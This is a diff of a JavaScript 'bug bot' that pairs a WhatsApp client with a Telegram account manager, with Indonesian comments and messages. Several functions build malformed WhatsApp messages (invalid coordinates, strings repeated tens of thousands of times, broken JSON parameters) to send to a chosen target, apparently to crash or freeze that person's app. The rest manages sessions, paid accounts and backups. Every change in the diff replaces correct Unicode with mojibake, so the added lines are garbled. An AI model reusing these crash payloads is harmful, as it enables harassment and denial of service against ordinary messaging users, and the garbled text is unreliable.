YoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
                 thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
@@ -13898,7 +13898,7 @@ async function iosTrashLocExtend(otax, target) {
     }
 };
 async function LocaNewotax(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
 
     const otaxx = proto.Message.fromObject({
         viewOnceMessage: {
@@ -13908,15 +13908,15 @@ async function LocaNewotax(otax, target) {
                         locationMessage: {
                             degreesLatitude: -999.03499999999999,
                             degreesLongitude: 922.9999999999999,
-                            name: "DO YOU KNOW ME?¿ otax" + "ꦽ".repeat(60000),
+                            name: "DO YOU KNOW ME?Â¿ otax" + "ê¦½".repeat(60000),
                             url: "https://t.me/Otapengenkawin",
                             contextInfo: {
                                 externalAdReply: {
                                     quotedAd: {
-                                        advertiserName: "ꦾ".repeat(60000),
+                                        advertiserName: "ê¦¾".repeat(60000),
                                         mediaType: "IMAGE",
                                         jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
-                                        caption: "οταϰ ιѕ нєяє"
+                                        caption: "Î¿Ï„Î±Ï° Î¹Ñ• Ð½Ñ”ÑÑ”"
                                     },
                                     placeholderKey: {
                                         remoteJid: "0@g.us",
@@ -13929,7 +13929,7 @@ async function LocaNewotax(otax, target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "нαιι ιм οταϰ⸙"
+                        text: "Ð½Î±Î¹Î¹ Î¹Ð¼ Î¿Ï„Î±Ï°â¸™"
                     },
                     nativeFlowMessage: {
                         messageParamsJson: "{[",
@@ -13943,7 +13943,7 @@ async function LocaNewotax(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     icon: "RIVIEW",
-                                    flow_cta: "ꦽ".repeat(10000),
+                                    flow_cta: "ê¦½".repeat(10000),
                                     flow_message_version: "3"
                                 })
                             },
@@ -13951,7 +13951,7 @@ async function LocaNewotax(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     icon: "RIVIEW",
-                                    flow_cta: "ꦾ".repeat(10000),
+                                    flow_cta: "ê¦¾".repeat(10000),
                                     flow_message_version: "3"
                                 })
                             }
@@ -13983,14 +13983,14 @@ async function iOSxTend(otax, target) {
         target,
         {
             extendedTextMessage: {
-                text: "💤‼️⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/RaldzzXyz" + "𑇂𑆵𑆴𑆿".repeat(15000),
+                text: "ðŸ’¤â€¼ï¸âƒŸâƒ°á°§./### âœ© > https://Wa.me/stickerpack/RaldzzXyz" + "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(15000),
                 matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
                 description:
-                    "҉҈⃝⃞⃟⃠⃤꙰꙲" +
-                    "𑇂𑆵𑆴𑆿".repeat(15000),
+                    "Ò‰ÒˆâƒâƒžâƒŸâƒ âƒ¤ê™°ê™²" +
+                    "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(15000),
                 title:
-                    "💤‼️⃟⃰ᰧ./### ✩" +
-                    "𑇂𑆵𑆴𑆿".repeat(15000),
+                    "ðŸ’¤â€¼ï¸âƒŸâƒ°á°§./### âœ©" +
+                    "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(15000),
                 previewType: "NONE",
                 jpegThumbnail: null,
                 inviteLinkGroupTypeV2: "DEFAULT",
@@ -14067,7 +14067,7 @@ async function videoBlank(otax, target) {
                 message: {
                     interactiveMessage: {
                         body: {
-                            text: "ꦽ".repeat(45000)
+                            text: "ê¦½".repeat(45000)
                         },
                         carouselMessage: {
                             cards,
@@ -14082,7 +14082,7 @@ async function videoBlank(otax, target) {
                             isForwarded: true,
                             mentionedJid: ["13135550002@s.whatsapp.net"],
                             externalAdReply: {
-                                title: "ោ៝".repeat(10000),
+                                title: "áŸ„áŸ".repeat(10000),
                                 body: "Hallo ! ",
                                 thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                                 mediaType: 1,
@@ -14290,7 +14290,7 @@ async function connectSession(folderPath, sessionName, retries = 5) {
             activeConnections[sessionName] = otax;
 
 
-            const resolveTimeout = setTimeout(resolveOnce, 20000); // Turunkan dari 45s → 20s agar tidak hang lama
+            const resolveTimeout = setTimeout(resolveOnce, 20000); // Turunkan dari 45s â†’ 20s agar tidak hang lama
 
             otax.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
                 const statusCode = lastDisconnect?.error?.output?.statusCode;
@@ -14316,13 +14316,13 @@ async function connectSession(folderPath, sessionName, retries = 5) {
                             otax.sendPresenceUpdate?.('available').then(() => {
                                 otax.lastChecked = Date.now();
                             }).catch(() => {
-                                console.log(`[HEARTBEAT] ⚠️ Presence gagal untuk: ${sessionName}, menghapus sesi (On-Demand)...`);
+                                console.log(`[HEARTBEAT] âš ï¸ Presence gagal untuk: ${sessionName}, menghapus sesi (On-Demand)...`);
                                 clearInterval(otax.__healthbeat);
                                 killExistingSession(sessionName);
                                 // reconnect dihapus
                             });
                         } else if (ws !== 0) {
-                            console.log(`[HEARTBEAT] 💀 Socket mati untuk: ${sessionName} (state: ${ws}), menghapus sesi (On-Demand)...`);
+                            console.log(`[HEARTBEAT] ðŸ’€ Socket mati untuk: ${sessionName} (state: ${ws}), menghapus sesi (On-Demand)...`);
                             clearInterval(otax.__healthbeat);
                             killExistingSession(sessionName);
                             // reconnect dihapus
@@ -14461,7 +14461,7 @@ async function checkActiveSessionInFolder(subfolderName) {
                 }
             }
 
-            console.log(`[SESSION] 🔄 Memuat & Reconnect sesi untuk: ${sessionName}`);
+            console.log(`[SESSION] ðŸ”„ Memuat & Reconnect sesi untuk: ${sessionName}`);
 
             if (fs.statSync(sessionDir).isDirectory() && fs.existsSync(path.join(sessionDir, "creds.json"))) {
                 const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
@@ -14473,7 +14473,7 @@ async function checkActiveSessionInFolder(subfolderName) {
                     const timeout = setTimeout(() => {
                         if (!resolved) {
                             resolved = true;
-                            console.log(`[SESSION] ⚠️ Reconnect timeout untuk: ${sessionName}.`);
+                            console.log(`[SESSION] âš ï¸ Reconnect timeout untuk: ${sessionName}.`);
                             resolve(null);
                         }
                     }, 15000); // Timeout 15 detik (turun dari 45s) agar tidak blocking lama
@@ -14516,7 +14516,7 @@ async function checkActiveSessionInFolder(subfolderName) {
                                 if (!resolved) {
                                     resolved = true;
                                     clearTimeout(timeout);
-                                    console.log(`[SESSION] ✅ Reconnect BENAR-BENAR sukses untuk: ${sessionName}`);
+                                    console.log(`[SESSION] âœ… Reconnect BENAR-BENAR sukses untuk: ${sessionName}`);
                                     activeConnections[sessionName] = newSock; // Simpan di cache hanya jika sudah open
                                     if (sessionRegistry[sessionName]) {
                                         sessionRegistry[sessionName].lastUsed = Date.now();
@@ -14529,7 +14529,7 @@ async function checkActiveSessionInFolder(subfolderName) {
                                 const isLoggedOut = statusCode === 401 || statusCode === 411;
 
                                 if (isLoggedOut) {
-                                    console.log(`[SESSION] ❌ Sesi Kadaluarsa/Logged Out untuk: ${sessionName}. Menghapus folder sesi.`);
+                                    console.log(`[SESSION] âŒ Sesi Kadaluarsa/Logged Out untuk: ${sessionName}. Menghapus folder sesi.`);
                                     try { newSock.ev.removeAllListeners(); } catch (_) { }
                                     delete activeConnections[sessionName];
                                     if (sessionRegistry[sessionName]) {
@@ -14542,7 +14542,7 @@ async function checkActiveSessionInFolder(subfolderName) {
                                         resolve(null); // Return null agar tidak lanjut!
                                     }
                                 } else {
-                                    console.log(`[SESSION] ⚠️ Koneksi Terputus sementara (Code: ${statusCode}) untuk: ${sessionName}. Retrying...`);
+                                    console.log(`[SESSION] âš ï¸ Koneksi Terputus sementara (Code: ${statusCode}) untuk: ${sessionName}. Retrying...`);
                                     try { newSock.ev.removeAllListeners(); } catch (_) { }
                                     try { newSock.ws.close(); } catch (e) { }
                                     try { newSock.end(undefined); } catch (e) { }
@@ -14552,7 +14552,7 @@ async function checkActiveSessionInFolder(subfolderName) {
                                         const delay = Math.min(2000 * retryCount, 10000);
                                         setTimeout(connectSocket, delay);
                                     } else if (!resolved) {
-                                        console.log(`[SESSION] ❌ Gagal reconnect setelah 3x untuk: ${sessionName}. Membersihkan.`);
+                                        console.log(`[SESSION] âŒ Gagal reconnect setelah 3x untuk: ${sessionName}. Membersihkan.`);
                                         delete activeConnections[sessionName];
                                         if (sessionRegistry[sessionName]) sessionRegistry[sessionName].connected = false;
                                         resolved = true;
@@ -14569,7 +14569,7 @@ async function checkActiveSessionInFolder(subfolderName) {
             }
         }
     } catch (err) {
-        console.error(`[SESSION] ❌ Error saat memuat sesi:`, err.message);
+        console.error(`[SESSION] âŒ Error saat memuat sesi:`, err.message);
     }
 
     return null;
@@ -14669,7 +14669,7 @@ async function startUserSessions() {
         }
     }
 
-    console.log(`[REGISTRY] 📋 ${registryCount} sesi terdaftar (tidak di-connect). Socket akan connect on-demand saat dibutuhkan.`);
+    console.log(`[REGISTRY] ðŸ“‹ ${registryCount} sesi terdaftar (tidak di-connect). Socket akan connect on-demand saat dibutuhkan.`);
 }
 
 
@@ -14837,20 +14837,20 @@ const USERS_PER_PAGE = 10
 function getFormattedUsers(page = 0) {
     const db = loadDatabase()
     if (!Array.isArray(db) || db.length === 0) {
-        return "❌ Tidak ada user"
+        return "âŒ Tidak ada user"
     }
 
     const start = page * USERS_PER_PAGE
     const end = start + USERS_PER_PAGE
     const slice = db.slice(start, end)
 
-    let text = `📋 <b>DAFTAR USER otax</b>\n\n`
+    let text = `ðŸ“‹ <b>DAFTAR USER otax</b>\n\n`
     for (const u of slice) {
-        text += `👤 ${u.username} | 🎯 ${u.role || "member"} | ⏳ ${u.expiredDate ? formatDateExp(u.expiredDate) : "-"}\n`
+        text += `ðŸ‘¤ ${u.username} | ðŸŽ¯ ${u.role || "member"} | â³ ${u.expiredDate ? formatDateExp(u.expiredDate) : "-"}\n`
     }
 
     const totalPage = Math.ceil(db.length / USERS_PER_PAGE)
-    text += `\n📄 Page ${page + 1} / ${totalPage}`
+    text += `\nðŸ“„ Page ${page + 1} / ${totalPage}`
 
     return text
 }
@@ -14859,8 +14859,8 @@ function getUserListKeyboard(page = 0) {
 
     const buttons = []
 
-    if (page > 0) buttons.push({ text: "⬅️ Back", callback_data: `list_user:${page - 1}` })
-    if (page < totalPage - 1) buttons.push({ text: "Next ➡️", callback_data: `list_user:${page + 1}` })
+    if (page > 0) buttons.push({ text: "â¬…ï¸ Back", callback_data: `list_user:${page - 1}` })
+    if (page < totalPage - 1) buttons.push({ text: "Next âž¡ï¸", callback_data: `list_user:${page + 1}` })
 
     return { inline_keyboard: buttons.length ? [buttons] : [] }
 }
@@ -14963,14 +14963,14 @@ async function getUserRoleFromGroups(userId) {
                 continue
             }
 
-            console.log(`[ROLE] ⚠️ API error saat cek grup ${groupId} untuk user ${userId}: ${description}`)
+            console.log(`[ROLE] âš ï¸ API error saat cek grup ${groupId} untuk user ${userId}: ${description}`)
             hadApiError = true
             continue
         }
     }
 
     if (hadApiError && !finalRole) {
-        throw new Error(`API Telegram error saat cek membership user ${userId} — hasil tidak reliable`)
+        throw new Error(`API Telegram error saat cek membership user ${userId} â€” hasil tidak reliable`)
     }
 
     return finalRole
@@ -15087,22 +15087,22 @@ async function restoreFromZip(zipPath) {
 }
 
 async function runBackup(label, hour) {
-    console.log(`[BACKUP] ⏳ Memulai backup ${label} - ${new Date().toLocaleString("id-ID")}`)
+    console.log(`[BACKUP] â³ Memulai backup ${label} - ${new Date().toLocaleString("id-ID")}`)
     try {
         deleteAllBackups()
         const zip = await createZipBackup()
         if (hour !== null) saveBackupState(hour)
-        console.log(`[BACKUP] ✅ Backup ${label} berhasil: ${zip}`)
+        console.log(`[BACKUP] âœ… Backup ${label} berhasil: ${zip}`)
         await bot.sendDocument('1925763520', zip, {
             caption:
-                `<tg-emoji emoji-id="5258477770735885832">📄</tg-emoji> <b>Backup ${label}</b>\n` +
-                `━━━━━━━━━━━━━━━━\n` +
-                `<tg-emoji emoji-id="5258419835922030550">🕔</tg-emoji> ${new Date().toLocaleString('id-ID')}`,
+                `<tg-emoji emoji-id="5258477770735885832">ðŸ“„</tg-emoji> <b>Backup ${label}</b>\n` +
+                `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n` +
+                `<tg-emoji emoji-id="5258419835922030550">ðŸ•”</tg-emoji> ${new Date().toLocaleString('id-ID')}`,
             parse_mode: 'HTML'
         })
         return true
     } catch (err) {
-        console.error(`[BACKUP] ❌ Backup ${label} gagal: ${err.message}`)
+        console.error(`[BACKUP] âŒ Backup ${label} gagal: ${err.message}`)
         return false
     }
 }
@@ -15116,7 +15116,7 @@ function checkMissedBackup() {
 
     if (hour === 0 && minute <= 55) {
         if (state.lastBackupDate !== dateStr || state.lastBackupHour !== 0) {
-            console.log("[BACKUP] ⚠️ Backup tengah malam terlewat, jalankan sekarang...")
+            console.log("[BACKUP] âš ï¸ Backup tengah malam terlewat, jalankan sekarang...")
             runBackup("tengah-malam (missed)", 0)
             return
         }
@@ -15124,13 +15124,13 @@ function checkMissedBackup() {
 
     if (hour === 12 && minute <= 55) {
         if (state.lastBackupDate !== dateStr || state.lastBackupHour !== 12) {
-            console.log("[BACKUP] ⚠️ Backup siang terlewat, jalankan sekarang...")
+            console.log("[BACKUP] âš ï¸ Backup siang terlewat, jalankan sekarang...")
             runBackup("siang (missed)", 12)
             return
         }
     }
 
-    console.log(`[BACKUP] ✔️ Scheduler aktif | Waktu WITA: ${now.toLocaleString("id-ID")}`)
+    console.log(`[BACKUP] âœ”ï¸ Scheduler aktif | Waktu WITA: ${now.toLocaleString("id-ID")}`)
 }
 
 setTimeout(() => checkMissedBackup(), 3000)
@@ -15151,18 +15151,18 @@ bot.onText(/^\/?cek(?:\s+(.+))?$/i, async (msg, match) => {
 
     const allowedIds = [OWNER_ID, 7027155167, 6252224704];
     if (!allowedIds.includes(fromId)) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
     }
 
     if (!targetUserId) {
-        return bot.sendMessage(chatId, '❌ Format salah. Gunakan: `/cek userid`', { parse_mode: 'Markdown' });
+        return bot.sendMessage(chatId, 'âŒ Format salah. Gunakan: `/cek userid`', { parse_mode: 'Markdown' });
     }
 
     const username = targetUserId.toLowerCase();
 
     try {
-        if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
-        if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");
+        if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "âŒ File database.json tidak ditemukan.");
+        if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "âŒ File keyList.json tidak ditemukan.");
 
         const db = JSON.parse(fs.readFileSync("database.json"));
         const keys = JSON.parse(fs.readFileSync("keyList.json"));
@@ -15171,7 +15171,7 @@ bot.onText(/^\/?cek(?:\s+(.+))?$/i, async (msg, match) => {
         const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);
 
         if (!dbUser && !keyUser) {
-            return bot.sendMessage(chatId, `❌ Target \`${targetUserId}\` tidak ditemukan di database.`, { parse_mode: 'Markdown' });
+            return bot.sendMessage(chatId, `âŒ Target \`${targetUserId}\` tidak ditemukan di database.`, { parse_mode: 'Markdown' });
         }
 
         const role = dbUser?.role || "member";
@@ -15206,7 +15206,7 @@ bot.onText(/^\/?cek(?:\s+(.+))?$/i, async (msg, match) => {
 *Android ID:* ${android}
 *Session Key:* \`${session}\`
 
-*── Info Kreator ──*
+*â”€â”€ Info Kreator â”€â”€*
 *Dibuat Oleh:* ${creatorName}
 *ID Telegram Kreator:* \`${creatorTgId}\`
 *ID Telegram User:* \`${userTgId}\`
@@ -15215,7 +15215,7 @@ bot.onText(/^\/?cek(?:\s+(.+))?$/i, async (msg, match) => {
 
         bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
     } catch (e) {
-        bot.sendMessage(chatId, '❌ Terjadi kesalahan saat membaca database.');
+        bot.sendMessage(chatId, 'âŒ Terjadi kesalahan saat membaca database.');
         console.error(e);
     }
 });
@@ -15229,7 +15229,7 @@ bot.onText(/^\/?delmanta$/i, async (msg) => {
         const config = loadTelegramConfig();
         const ownerList = Array.isArray(config.ownerList) ? config.ownerList : [];
         if (!ownerList.includes(fromId)) {
-            return bot.sendMessage(chatId, "❌ Akses Ditolak! Hanya OWNER yang bisa menggunakan perintah ini.");
+            return bot.sendMessage(chatId, "âŒ Akses Ditolak! Hanya OWNER yang bisa menggunakan perintah ini.");
         }
     }
 
@@ -15246,7 +15246,7 @@ bot.onText(/^\/?delmanta$/i, async (msg) => {
     const deletedCount = initialCount - newDb.length;
     saveDatabase(newDb);
 
-    bot.sendMessage(chatId, `✅ Eksekusi Selesai! Berhasil membersihkan ${deletedCount} akun palsu yang mengandung unsur nama 'manta'.`);
+    bot.sendMessage(chatId, `âœ… Eksekusi Selesai! Berhasil membersihkan ${deletedCount} akun palsu yang mengandung unsur nama 'manta'.`);
 });
 
 bot.onText(/^\/?(start|menu)/, async (msg) => {
@@ -15260,26 +15260,26 @@ bot.onText(/^\/?(start|menu)/, async (msg) => {
 <b> MANTA ACCOUNT MANAGER</b>
 
 <blockquote>
-👋 Hai <b>${name}</b>
+ðŸ‘‹ Hai <b>${name}</b>
 
 Bot ini digunakan untuk <b>pembuatan & manajemen akun</b> secara otomatis dan aman.
 
-<b>📌 Cara Membuat Akun:</b>
-1️⃣ Pastikan kamu tergabung di <b>grup resmi MANTA</b>
-2️⃣ Klik tombol <b>🆕 Buat Akun</b>
-3️⃣ Masukkan data akun sesuai format yang diminta
+<b>ðŸ“Œ Cara Membuat Akun:</b>
+1ï¸âƒ£ Pastikan kamu tergabung di <b>grup resmi MANTA</b>
+2ï¸âƒ£ Klik tombol <b>ðŸ†• Buat Akun</b>
+3ï¸âƒ£ Masukkan data akun sesuai format yang diminta
 
-<b>⚠️ Ketentuan:</b>
-• 1 Telegram = 1 akun
-• Akun akan <b>terhapus otomatis</b> jika keluar dari grup
-• Masa aktif mengikuti durasi yang ditentukan
+<b>âš ï¸ Ketentuan:</b>
+â€¢ 1 Telegram = 1 akun
+â€¢ Akun akan <b>terhapus otomatis</b> jika keluar dari grup
+â€¢ Masa aktif mengikuti durasi yang ditentukan
 
-<b>🔒 Keamanan:</b>
+<b>ðŸ”’ Keamanan:</b>
 Akun terikat ke Telegram & grup
 Tidak bisa dipindahkan ke device lain
 </blockquote>
 
-<b>🌐 by TEAM MANTA</b>
+<b>ðŸŒ by TEAM MANTA</b>
 `
 
     const role = await resolveUserRole(id);
@@ -15290,30 +15290,30 @@ Tidak bisa dipindahkan ke device lain
         parse_mode: "HTML",
         reply_markup: {
             inline_keyboard: [
-                [{ text: "🆕 Buat Akun", callback_data: "create_member" }],
+                [{ text: "ðŸ†• Buat Akun", callback_data: "create_member" }],
 
                 ...(isTK || isMe ? [[
-                    { text: "🏍️ Buat Akun Buyyer", callback_data: "create_member_tk" },
+                    { text: "ðŸï¸ Buat Akun Buyyer", callback_data: "create_member_tk" },
                     {
-                        text: "📋 Cek Akun Member",
+                        text: "ðŸ“‹ Cek Akun Member",
                         callback_data: "cek_member_saya"
                     },
                     {
-                        text: "🗑 Hapus Member Saya",
+                        text: "ðŸ—‘ Hapus Member Saya",
                         callback_data: "hapus_member_saya"
                     }
                 ]] : []),
 
-                [{ text: "📄 Cek Akun Saya", callback_data: "cek_akun" }],
-                [{ text: "🗑 Hapus Akun Saya", callback_data: "del_akun" }],
+                [{ text: "ðŸ“„ Cek Akun Saya", callback_data: "cek_akun" }],
+                [{ text: "ðŸ—‘ Hapus Akun Saya", callback_data: "del_akun" }],
 
                 ...(isOwner ? [[
-                    { text: "⏳ Set Expired", callback_data: "set_expire" },
-                    { text: "📋 List User", callback_data: "list_user" }
+                    { text: "â³ Set Expired", callback_data: "set_expire" },
+                    { text: "ðŸ“‹ List User", callback_data: "list_user" }
                 ], [
-                    { text: "🎛 Buat Custom User", callback_data: "create_custom" },
-                    { text: "🗑 Hapus User", callback_data: "delete_user" },
-                    { text: "🗑 Clear Member >30d", callback_data: "delmemb" }
+                    { text: "ðŸŽ› Buat Custom User", callback_data: "create_custom" },
+                    { text: "ðŸ—‘ Hapus User", callback_data: "delete_user" },
+                    { text: "ðŸ—‘ Clear Member >30d", callback_data: "delmemb" }
                 ]] : [])
             ]
         }
@@ -15343,7 +15343,7 @@ bot.onText(/^\/?cekoi$/, async msg => {
         if (!list) list = "Tidak ada"
 
         bot.sendMessage(chatId, `
-📊 <b>MEMBER NON-TK</b>
+ðŸ“Š <b>MEMBER NON-TK</b>
 
 Total : <b>${members.length}</b>
 
@@ -15377,16 +15377,16 @@ bot.onText(/^\/?deloi$/, async msg => {
         }
 
         if (deleted.length === 0) {
-            return bot.sendMessage(chatId, "✅ Tidak ada member non-TK yang perlu dihapus")
+            return bot.sendMessage(chatId, "âœ… Tidak ada member non-TK yang perlu dihapus")
         }
 
         saveDatabase(remain)
 
         bot.sendMessage(chatId, `
-🗑️ <b>DELETE MEMBER NON-TK</b>
+ðŸ—‘ï¸ <b>DELETE MEMBER NON-TK</b>
 
 Total dihapus : <b>${deleted.length}</b>
-ℹ️ Member APK AMAN (tidak dihapus)
+â„¹ï¸ Member APK AMAN (tidak dihapus)
 `, { parse_mode: "HTML" })
     } catch { }
 })
@@ -15398,7 +15398,7 @@ bot.onText(/^\/panel(?:\s+(.+))?/, async (msg, match) => {
     if (!input) {
         return bot.sendMessage(
             msg.chat.id,
-            "❌ Format salah!\nGunakan: `/panel domain,ptla_xxx,ptlc_yyy,limit`\nContoh:\n`/panel https://panel.otax.fun,ptla_...,ptlc_...,15`",
+            "âŒ Format salah!\nGunakan: `/panel domain,ptla_xxx,ptlc_yyy,limit`\nContoh:\n`/panel https://panel.otax.fun,ptla_...,ptlc_...,15`",
             { parse_mode: "Markdown" }
         );
     }
@@ -15406,7 +15406,7 @@ bot.onText(/^\/panel(?:\s+(.+))?/, async (msg, match) => {
     try {
         const parts = input.split(',');
         if (parts.length < 4) {
-            return bot.sendMessage(msg.chat.id, "❌ Format salah! Pastikan ada 4 bagian yang dipisah koma (domain, ptla, ptlc, limit).");
+            return bot.sendMessage(msg.chat.id, "âŒ Format salah! Pastikan ada 4 bagian yang dipisah koma (domain, ptla, ptlc, limit).");
         }
 
         const domain = parts[0].trim();
@@ -15415,7 +15415,7 @@ bot.onText(/^\/panel(?:\s+(.+))?/, async (msg, match) => {
         const limit = parseInt(parts[3].trim());
 
         if (isNaN(limit)) {
-            return bot.sendMessage(msg.chat.id, "❌ Limit harus berupa angka.");
+            return bot.sendMessage(msg.chat.id, "âŒ Limit harus berupa angka.");
         }
 
         let panels = [];
@@ -15437,11 +15437,11 @@ bot.onText(/^\/panel(?:\s+(.+))?/, async (msg, match) => {
 
         return bot.sendMessage(
             msg.chat.id,
-            `✅ *Panel Berhasil Ditambahkan!*\n\n🌐 *Domain:* ${domain}\n📊 *Limit:* ${limit}\n\nKini server bot akan dirotasi secara otomatis ke panel ini jika slot masih tersedia.`,
+            `âœ… *Panel Berhasil Ditambahkan!*\n\nðŸŒ *Domain:* ${domain}\nðŸ“Š *Limit:* ${limit}\n\nKini server bot akan dirotasi secara otomatis ke panel ini jika slot masih tersedia.`,
             { parse_mode: "Markdown" }
         );
     } catch (e) {
-        return bot.sendMessage(msg.chat.id, `❌ Terjadi kesalahan: ${e.message}`);
+        return bot.sendMessage(msg.chat.id, `âŒ Terjadi kesalahan: ${e.message}`);
     }
 });
 
@@ -15458,35 +15458,35 @@ bot.onText(/^\/msg(?:\s+(.+))?/, async (msg, match) => {
     if (!text) {
         return bot.sendMessage(
             msg.chat.id,
-            "❌ Gunakan:\n/msg pesan\natau reply pesan + /msg"
+            "âŒ Gunakan:\n/msg pesan\natau reply pesan + /msg"
         );
     }
 
     try {
-        console.log("🤖 [BOT] /msg command received from:", msg.from.username);
-        console.log("📝 Message text:", text);
+        console.log("ðŸ¤– [BOT] /msg command received from:", msg.from.username);
+        console.log("ðŸ“ Message text:", text);
 
 
         const notifications = loadNotifications();
-        console.log("📋 Current notifications count:", notifications.length);
+        console.log("ðŸ“‹ Current notifications count:", notifications.length);
 
 
         if (!Array.isArray(notifications)) {
-            console.log("⚠️ notifications is not array, resetting...");
+            console.log("âš ï¸ notifications is not array, resetting...");
             saveNotifications([]);
-            console.log("✅ notifications reset to empty array");
-            return bot.sendMessage(msg.chat.id, "❌ Error: Data notifikasi rusak, coba lagi.");
+            console.log("âœ… notifications reset to empty array");
+            return bot.sendMessage(msg.chat.id, "âŒ Error: Data notifikasi rusak, coba lagi.");
         }
 
 
         const newNotification = {
             id: Date.now(),
-            title: "📢 Pengumuman Owner",
+            title: "ðŸ“¢ Pengumuman Owner",
             message: text,
             createdAt: new Date().toISOString(),
         };
 
-        console.log("➕ Adding new notification:", newNotification);
+        console.log("âž• Adding new notification:", newNotification);
 
 
         notifications.unshift(newNotification);
@@ -15494,7 +15494,7 @@ bot.onText(/^\/msg(?:\s+(.+))?/, async (msg, match) => {
 
         saveNotifications(notifications);
 
-        console.log("💾 Saved successfully. New count:", notifications.length);
+        console.log("ðŸ’¾ Saved successfully. New count:", notifications.length);
 
 
         try {
@@ -15509,17 +15509,17 @@ bot.onText(/^\/msg(?:\s+(.+))?/, async (msg, match) => {
                         }));
                     }
                 });
-                console.log("📡 Broadcasted to WebSocket clients");
+                console.log("ðŸ“¡ Broadcasted to WebSocket clients");
             }
         } catch (wsError) {
-            console.log("⚠️ Could not broadcast to WebSocket:", wsError.message);
+            console.log("âš ï¸ Could not broadcast to WebSocket:", wsError.message);
         }
 
-        bot.sendMessage(msg.chat.id, "✅ Notifikasi berhasil dikirim ke semua user");
+        bot.sendMessage(msg.chat.id, "âœ… Notifikasi berhasil dikirim ke semua user");
 
     } catch (error) {
-        console.error("❌ Error in /msg command:", error);
-        bot.sendMessage(msg.chat.id, "❌ Terjadi kesalahan saat menyimpan notifikasi: " + error.message);
+        console.error("âŒ Error in /msg command:", error);
+        bot.sendMessage(msg.chat.id, "âŒ Terjadi kesalahan saat menyimpan notifikasi: " + error.message);
     }
 });
 bot.onText(/^\/deltk(?:\s+(.+))?$/i, async (msg, match) => {
@@ -15532,7 +15532,7 @@ bot.onText(/^\/deltk(?:\s+(.+))?$/i, async (msg, match) => {
     if (!isOwner) return
 
     const arg = (match?.[1] || "").trim()
-    if (!arg) return bot.sendMessage(chatId, "❌ Masukkan username / id")
+    if (!arg) return bot.sendMessage(chatId, "âŒ Masukkan username / id")
 
     const db = loadDatabase()
 
@@ -15541,15 +15541,15 @@ bot.onText(/^\/deltk(?:\s+(.+))?$/i, async (msg, match) => {
         (u.username === arg || String(u.createdById) === String(arg))
     )
 
-    if (idx === -1) return bot.sendMessage(chatId, "❌ Member tidak ditemukan")
+    if (idx === -1) return bot.sendMessage(chatId, "âŒ Member tidak ditemukan")
 
     const removed = removeUserFromDatabase(db, idx)
     saveDatabase(db)
 
     return bot.sendMessage(chatId, `
-🗑 <b>MEMBER TK DIHAPUS OWNER</b>
+ðŸ—‘ <b>MEMBER TK DIHAPUS OWNER</b>
 
-👤 <b>${removed.username}</b>
+ðŸ‘¤ <b>${removed.username}</b>
 Creator ID: <code>${removed.createdById}</code>
 `, { parse_mode: "HTML" })
 })
@@ -15585,28 +15585,28 @@ bot.onText(/^\/delmemb$/i, async (msg) => {
     })
 
     if (count === 0) {
-        return bot.sendMessage(chatId, "✅ Tidak ditemukan akun member yang sudah expired.")
+        return bot.sendMessage(chatId, "âœ… Tidak ditemukan akun member yang sudah expired.")
     }
 
     saveDatabase(filteredDb)
-    bot.sendMessage(chatId, `✅ Berhasil menghapus <b>${count}</b> akun member yang sudah expired.\n\n${deletedNames.slice(0, 10).join(', ')}${deletedNames.length > 10 ? ' ...' : ''}`, { parse_mode: "HTML" })
+    bot.sendMessage(chatId, `âœ… Berhasil menghapus <b>${count}</b> akun member yang sudah expired.\n\n${deletedNames.slice(0, 10).join(', ')}${deletedNames.length > 10 ? ' ...' : ''}`, { parse_mode: "HTML" })
 })
 
 bot.onText(/^\/refresh/, async (msg) => {
     const config = loadTelegramConfig()
     if (!config.ownerList.includes(msg.from.id)) return
     await refreshUserSessions()
-    bot.sendMessage(msg.chat.id, "⚠️ Server refreshing 30-60 detik")
+    bot.sendMessage(msg.chat.id, "âš ï¸ Server refreshing 30-60 detik")
 })
 
 bot.onText(/^\/globalsession/, async (msg) => {
     if (msg.from.id !== OWNER_ID) return
     if (msg.chat.type === "private") return
 
